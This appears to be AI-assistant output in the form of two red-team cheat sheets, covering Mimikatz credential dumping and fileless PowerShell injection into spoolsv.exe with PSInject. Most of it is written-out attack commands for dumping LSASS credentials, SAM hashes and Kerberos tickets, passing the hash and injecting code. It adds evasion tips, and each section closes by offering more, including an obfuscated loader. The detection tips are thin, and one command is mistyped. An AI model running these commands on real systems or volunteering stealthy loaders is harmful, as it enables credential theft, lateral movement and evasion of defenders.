
## Mimikatz Basics: Credential Extraction & Abuse

**Mimikatz** is a powerful post-exploitation tool used to extract plaintext credentials, hashes, PINs, and Kerberos tickets from memory. It is widely used in red team and adversary simulations, and frequently detected in blue team operations.

---

### Common Use Cases

* Dumping **cleartext passwords**
* Extracting **NTLM hashes**
* Abusing **Kerberos tickets** (pass-the-ticket, golden ticket, silver ticket)
* Performing **pass-the-hash** and **overpass-the-hash** attacks
* Dumping **LSASS memory** for offline analysis

---

### Example Commands

#### 1. Run Mimikatz as Admin

```cmd
mimikatz.exe
```

#### 2. Elevate and Load Modules

```mimikatz
privilege::debug
sekurlsa::logonpasswords
```

* `privilege::debug` enables debug privileges to interact with LSASS
* `sekurlsa::logonpasswords` dumps credentials currently stored in memory

#### 3. Dump NTLM Hashes

```mimikatz
lsadump::sam
```

#### 4. Extract Kerberos Tickets

```mimikatz
sekurlsa::tickets
```

#### 5. Pass-the-Hash Example

```mimikatz
tsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NTLM-HASH> /run:cmd.exe
```

---

### Detection Tips

* Monitor for access to **LSASS memory** (`Sysmon Event ID 10` — process access).
* Detect loading of **signed-but-malicious drivers** or **execution from uncommon paths**.
* Use **Event ID 4624/4625** (logon success/failure) to trace unusual authentications.

---

### Notes

* Requires **Administrator or SYSTEM** access.
* Most AV/EDRs flag Mimikatz immediately unless obfuscated or run in memory.
* Use tools like **Invoke-Mimikatz**, **SharpKatz**, or **PE injection loaders** for stealthy execution.

---

Let me know if you'd like an obfuscated PowerShell loader or integration into your red team playbook.




## Unmanaged PowerShell Injection with PSInject

To showcase **unmanaged PowerShell injection**, we can inject a PowerShell-like DLL into an existing Windows process, such as `spoolsv.exe`, which is part of the **Print Spooler service**.

This technique demonstrates how PowerShell code can be executed **in-memory** from a remote context without creating new processes or touching disk in a traditional way.

---

### Requirements

* **PowerSploit** (specifically `Invoke-PSInject.ps1`)
* Administrator privileges
* `spoolsv.exe` or any other long-running, quiet process

---

### Example: Injecting into `spoolsv.exe`

```powershell
powershell -ep bypass -Command ". .\Invoke-PSInject.ps1; Invoke-PSInject -ProcId [PID of spoolsv.exe] -PoshCode 'V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi'"
```

**Explanation:**

* `-ep bypass`: Allows execution of unsigned PowerShell scripts.
* `Invoke-PSInject`: Injects .NET-based PowerShell into a remote process.
* `-ProcId`: Target process ID of `spoolsv.exe` (get it via Task Manager or `Get-Process`).
* `-PoshCode`: Base64-encoded PowerShell payload.

**Decoded payload:**

```powershell
Write-Host "Hello, Guru99!"
```

---

### What Happens Internally

* The unmanaged process (`spoolsv.exe`) is injected with a minimal .NET runtime.
* After injection, it becomes **managed** by .NET, observable via tools like **Process Hacker**.
* The injected code runs within that process without spawning a new PowerShell instance.

---

### Detection Tips

* Use **Process Hacker** to observe:

  * Transition of the process from unmanaged to managed.
  * Loaded DLLs in the **Modules** tab.
* Monitor **Sysmon Event ID 7** for new DLL loads, especially non-standard PowerShell runtimes.
* Look for `.NET CLR` activity in typically unmanaged processes (like `spoolsv.exe`).

---

### Summary

* This method is stealthy: no new processes, minimal disk footprint.
* Ideal for demonstrating fileless execution in red team labs.
* Should be closely monitored in blue team environments due to its abuse potential.

Let me know if you want this extended with YARA/Sigma rules or added to your manual!
